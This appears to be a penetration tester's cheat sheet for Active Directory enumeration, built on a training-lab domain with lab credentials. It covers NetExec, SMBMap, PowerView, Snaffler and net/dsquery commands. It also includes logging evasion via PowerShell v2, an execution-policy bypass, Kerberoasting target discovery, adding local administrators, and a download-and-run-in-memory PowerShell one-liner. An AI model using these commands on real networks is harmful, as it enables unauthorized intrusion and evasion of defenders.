
## Table of Contents:

## Linux
- [[#NetExec]]
- [[#SMBMap]]
- [[#rpcclient]]
- [[#Windapsearch]]
- [[BloodHound]]

## Windows
- [[#Windapsearch]]
- [[#Active Directory Module]]
- [[#[Powerview](https //github.com/PowerShellMafia/PowerSploit/tree/master/Recon) - [Docs](https //powersploit.readthedocs.io/en/latest/Recon/).|PowerView]]
- [[#SharpView]]
- [[#Snaffler]]
- [[#Stealthy Enumeration]]

---
## NetExec

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
### Domain user enumeration

sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
### Domain group enumeration

sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
### logged on users 

sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
### shares enumeration DS

sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
### spider plus
```

`nxc` writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`.

---
## SMBMap

```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
### smbmap can check access

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
### Recusive list of all directories, `--dir-only` is used to list only dir.
```

---
## rpcclient

A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier utilized by Windows to track and identify objects. `SID of User = SID of Domain + RID of User`.

```shell
rpcclient $> enumdomusers
### Enumerate domain users with RID

rpcclient $> queryuser 0x457
### RPCClient User Enumeration By RID
```

---
## Windapsearch

```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
### Domain admins

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
### Privileged users
```

---
## Active Directory Module

```powershell
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
### Load ActiveDirectory Module

PS C:\htb> Get-ADDomain
### Get Domain Info

PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
### Enumerating accounts that may be susceptible to a Kerberoasting attack.

PS C:\htb> Get-ADTrust -Filter *
### Check for Trust Relationships

PS C:\htb> Get-ADGroup -Filter * | select name
### Group Enumeration

PS C:\htb> Get-ADGroup -Identity "Backup Operators"
### Detailed Group Info

PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
### Enumerate group members
```

---
## [Powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) - [Docs](https://powersploit.readthedocs.io/en/latest/Recon/).

```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
### Enumerating domain users (all or specified)

PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
### Enumerating Group info, -Recurse: finds member of groups under this group

PS C:\htb> Get-DomainTrustMapping
### Trust Enumeration

PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
### Testing for Local Admin Access

PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
### Enumerating accounts susceptible to kerberoasting
```

---
## SharpView

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help
### We can type a method name with `-Help` to get an argument list.

PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
### Info about forend user
```

---
## Snaffler

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
### Finds potentially sensitive files on network shares.
```

---
## Stealthy Enumeration

`Powershell -Version 2` doesn't log the commands ran on it.
### Basic Enumeration Command

```powershell
C:\htb> hostname
C:\htb> systeminfo
C:\htb> [System.Environment]::OSVersion.Version
C:\htb> wmic qfe get Caption,Description,HotFixID,InstalledOn
C:\htb> ipconfig /all
C:\htb> set
C:\htb> echo %USERDOMAIN%
C:\htb> echo %logonserver%
```

### Powershell 

```powershell
PS C:\htb> Get-Module                                
# List all module available

PS C:\htb> Get-ExecutionPolicy -List                 
# Will print execution policy settings

PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process 
# Modify execution policy for this session

PS C:\htb> Get-ChildItem Env: | ft Key,Value         
# Return environment values

PS C:\htb> Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# With this string, we can get the specified user's PowerShell history

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 
# This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
```

### Checking Defense

```powershell
PS C:\htb> netsh advfirewall show allprofiles
### Firewall

C:\htb> sc query windefend
### Windows Defender

PS C:\htb> Get-MpComputerStatus
### Windows Defender

C:\htb> qwinsta
### Checking current logged in user 
```

### WMI

```powershell
C:\htb> wmic qfe get Caption,Description,HotFixID,InstalledOn 
# Hotfixes
C:\htb> wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
# Display basic host info

C:\htb> wmic process list /format:list 
# Listing of all processes
C:\htb> wmic ntdomain list /format:list 
# Info about Domain and DC
C:\htb> wmic useraccount list /format:list 
# Info about local acount and domain account that have logged on the device

C:\htb> wmic group list /format:list 
# Info about local groups
C:\htb> wmic sysaccount list /format:list 
# Dumps info about any system accounts that are being used as service accs

C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
# Bunch of Domain infos
```

### Net

```powershell
C:\htb> net share 
# Check current share

C:\htb> net use x: \computer\share 
# Mount share locally

C:\htb> net accounts         
# Info about password requirements
C:\htb> net accounts /domain 
# Password and lockout policy

C:\htb> net group /domain    
# Info about domain groups
C:\htb> net group "Domain Admins" /domain 
# List users with DA Privs
C:\htb> net group "domain computers" /domain 
# List PCs connected to the domain
C:\htb> net group "Domain Controllers" /domain 
# List PC account of domains controllers
C:\htb> net group <group_name> /domain 
# List users that belongs to the group
C:\htb> net group /domain 
# List domain groups 

C:\htb> net localgroup 
# List all available groups
C:\htb> net localgroup administrators /domain 
# List users that belongs to the administrators group inside the domain
C:\htb> net localgroup administrators 
# Info about administrators groups
C:\htb> net localgroup administrators [username] /add 
# Add user to administrators

C:\htb> net user [account] /domain 
# Info about account within the domain
C:\htb> net user %username% 
# Info about the current user

C:\htb> net view 
# List of computer (servers only)
C:\htb> net view /all /domain[:domainname]
# List all computers (servers) in the domain
C:\htb> net view \computer /ALL 
# List shares of a computer
C:\htb> net view /domain 
# List of domains/workgroups
```

### [Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\))

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context.

```powershell
C:\htb> dsquery user
# User search

C:\htb> dsquery computer
# Computer search

C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
# Wildcard search

C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
# User with specific attributes set (PASSWD_NOTREQD)

C:\htb> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr SAMAccountName
# Searching for Domain Controllers
```

---